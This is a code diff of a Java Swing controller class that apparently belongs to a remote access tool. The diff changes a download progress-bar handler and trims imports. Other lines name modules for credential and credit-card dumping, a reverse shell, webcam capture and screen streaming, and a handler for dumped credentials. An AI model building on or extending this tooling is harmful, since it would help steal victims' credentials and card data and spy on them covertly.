@@ -9,16 +9,11 @@ import ProgressBar.Bar;
 import Server.ServerGUI;
 import TableUtils.Credentials.CredentialsManagerGUI;
 import Utils.Converter;
-import Utils.CredentialsDumper;
-import Packets.Credentials.AccountCredentials;
-import Packets.Credentials.CombinedCredentials;
-import Packets.Credentials.CreditCardCredentials;
 import TableUtils.FileManager.FileManagerGUI;
 import TableUtils.ReverseShell.ReverseShellGUI;
 import TableUtils.ScreenStreaming.ScreenStreamerGUI;
 import TableUtils.WebcamManager.WebcamGUI;
 import Updater.UpdaterInterface;
-import Utils.UniqueByteIDGenerator;
 import org.json.JSONArray;
 import org.json.JSONObject;
 
@@ -26,9 +21,6 @@ import javax.swing.*;
 import javax.swing.table.DefaultTableModel;
 import javax.swing.table.TableModel;
 import java.awt.*;
-import java.io.File;
-import java.io.IOException;
-import java.nio.file.Files;
 import java.util.*;
 import java.util.List;
 import java.util.concurrent.ConcurrentHashMap;
@@ -78,6 +70,7 @@ public class SwingUpdater implements UpdaterInterface {
         mapOfResponses.put(Response.PERMISSIONS, this::showPermissionStatus);
         mapOfResponses.put(Response.SHOW_DOWNLOADED, this::showDownloadedFiles);
         mapOfResponses.put(Response.DUMP_CREDENTIALS, this::updateCredentialsDumper);
+        mapOfResponses.put(Response.PROGRESS_BAR, this::updateDownloadState);
     }
 
     public int getPositionOfExisting(String identifier, TableModel tableModel) {
@@ -349,10 +342,10 @@ public class SwingUpdater implements UpdaterInterface {
         FolderOpener.open(jsonObject.getString("path"));
     }
 
-    @Override
-    public void updateDownloadState(byte id, int read, boolean isLastPacket) {
-        Bar<?> bar = mapOfProgressBars.get(id);
-        if (bar != null) bar.updateProgress(read, isLastPacket);
+
+    public void updateDownloadState(JSONObject jsonObject) {
+        Bar<?> bar = mapOfProgressBars.get((byte)jsonObject.getInt("channel_id"));
+        if (bar != null) bar.updateProgress(jsonObject.getInt("read_size"), jsonObject.getBoolean("is_last_packet"));
     }
 
     @Override
